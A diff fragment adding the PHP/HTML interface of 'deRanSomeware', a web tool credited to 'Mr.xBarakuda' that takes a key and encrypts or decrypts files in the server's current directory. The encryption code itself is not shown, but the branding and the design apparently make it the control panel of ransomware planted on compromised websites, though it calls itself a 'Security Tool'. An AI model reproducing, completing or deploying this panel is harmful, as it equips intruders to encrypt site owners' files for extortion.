+        $output_logs[] = ['type' => 'error', 'msg' => 'Key cannot be empty!'];
+    }
+}
 ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>deRanSomeware - Security Tool</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+        body {
+            font-family: 'JetBrains+Mono', monospace;
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+        }
+        .glass {
+            background: rgba(20, 20, 20, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .glow-green { box-shadow: 0 0 15px rgba(34, 197, 94, 0.2); }
+        .glow-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.2); }
+        .log-container::-webkit-scrollbar { width: 6px; }
+        .log-container::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+
+    <div class="w-full max-w-4xl glass rounded-2xl overflow-hidden shadow-2xl">
+        <!-- Header -->
+        <div class="bg-gradient-to-r from-green-900/20 to-blue-900/20 p-6 border-b border-white/10">
+            <h1 class="text-3xl font-bold tracking-tighter text-white flex items-center gap-3">
+                <i class="fa-solid fa-shield-virus text-green-500"></i>
+                DERANSOMEWARE <span class="text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded border border-green-500/30">v1.0</span>
+            </h1>
+            <p class="text-gray-400 text-sm mt-1">Mr.xBarakuda Encryption & Decryption</p>
+        </div>
+
+        <div class="p-8">
+            <!-- Form -->
+            <form action="" method="post" class="space-y-6">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <div class="md:col-span-2">
+                        <label class="block text-xs font-bold text-gray-500 uppercase tracking-widest mb-2">Encryption Key</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-gray-500">
+                                <i class="fa-solid fa-key"></i>
+                            </span>
+                            <input type="password" name="key" placeholder="Enter your secret key..."
+                                   class="w-full bg-black/40 border border-white/10 rounded-xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-green-500/50 transition-all placeholder:text-gray-700">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-gray-500 uppercase tracking-widest mb-2">Operation</label>
+                        <select name="method" class="w-full bg-black/40 border border-white/10 rounded-xl py-4 px-4 text-white focus:outline-none focus:border-green-500/50 appearance-none cursor-pointer">
+                            <option value="1">🔒 Encrypt Files</option>
+                            <option value="2">🔓 Decrypt Files</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="flex items-center justify-between pt-4">
+                    <div class="text-xs text-gray-500 italic">
+                        <i class="fa-solid fa-circle-info mr-1"></i> Current Path: <span class="text-gray-300"><?php echo htmlspecialchars(getcwd()); ?></span>
+                    </div>
+                    <button type="submit" name="submit" value="1"
+                            class="bg-green-600 hover:bg-green-500 text-white font-bold py-4 px-10 rounded-xl transition-all active:scale-95 shadow-lg glow-green flex items-center gap-2">
+                        EXECUTE PROCESS <i class="fa-solid fa-bolt"></i>
+                    </button>
+                </div>
+            </form>
+
+            <!-- Results -->
+            <?php if (!empty($output_logs)): ?>
+            <div class="mt-10 space-y-4">
+                <h3 class="text-xs font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
+                    <i class="fa-solid fa-terminal"></i> Execution Logs
+                </h3>
+                <div class="log-container bg-black/60 border border-white/5 rounded-xl p-4 h-64 overflow-y-auto text-sm space-y-1 font-mono">
+                    <?php foreach ($output_logs as $log): ?>
+                        <div class="flex gap-3 py-1 border-b border-white/5 last:border-0">
+                            <?php if ($log['type'] === 'success'): ?>
+                                <span class="text-green-500"><i class="fa-solid fa-check-circle"></i></span>
+                                <span class="text-gray-300"><?php echo htmlspecialchars($log['msg']); ?></span>
+                            <?php elseif ($log['type'] === 'error'): ?>
+                                <span class="text-red-500"><i class="fa-solid fa-circle-xmark"></i></span>
+                                <span class="text-red-400 font-bold"><?php echo htmlspecialchars($log['msg']); ?></span>
+                            <?php else: ?>
+                                <span class="text-blue-500"><i class="fa-solid fa-info-circle"></i></span>
+                                <span class="text-blue-300"><?php echo htmlspecialchars($log['msg']); ?></span>
+                            <?php endif; ?>
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+            </div>
+            <?php endif; ?>
+        </div>
+
+        <div class="bg-black/40 p-4 border-t border-white/5 text-center">
+            <p class="text-[10px] text-gray-600 uppercase tracking-[0.2em]">
+                Secure Environment &bull; Authorized Access Only &bull; deRanSomeware &copy; <?php echo date('Y'); ?>
+            </p>
+        </div>
+    </div>
+</body>
+</html>
